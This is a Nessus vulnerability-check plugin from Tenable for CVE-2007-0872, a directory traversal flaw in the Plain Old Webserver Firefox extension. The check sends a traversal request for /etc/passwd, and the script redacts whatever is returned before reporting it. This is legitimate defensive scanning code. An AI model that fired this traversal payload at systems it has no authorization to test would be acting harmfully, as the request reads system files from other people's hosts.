#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#


include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(24669);
  script_version("1.18");

  script_cve_id("CVE-2007-0872");
  script_bugtraq_id(22502);

  script_name(english:"Plain Old Webserver URI Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a file using POW");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is susceptible to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Plain Old Webserver, a Firefox extension
that acts as a web server. 

The version of Plain Old Webserver (pow) installed on the remote host
fails to sanitize the URL of directory traversal sequences.  An
unauthenticated attacker can exploit this to read files on the
affected host subject to the permissions of the user id under which
Firefox runs." );
 script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2007/Feb/196" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"false");


 script_set_attribute(attribute:"plugin_publication_date", value: "2007/02/19");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/09");
 script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 6670);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:6670);

# Make sure the banner looks like POW.
banner = get_http_banner(port:port);
if (!banner || "pow_server: POW" >!< banner) exit(0);


# Try to read a file.
file = "/etc/passwd";
r = http_send_recv3(method:"GET", item:string("/../../../../../../../../../../", file), port:port);
if (isnull(r)) exit(0);
res = r[2];

if (egrep(string:res, pattern:"root:.*:0:[01]:"))
{
  res = data_protection::redact_etc_passwd(output:res);
  report = string(
    "Here are the contents of the file '", file, "' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_warning(port:port, extra:report);
}

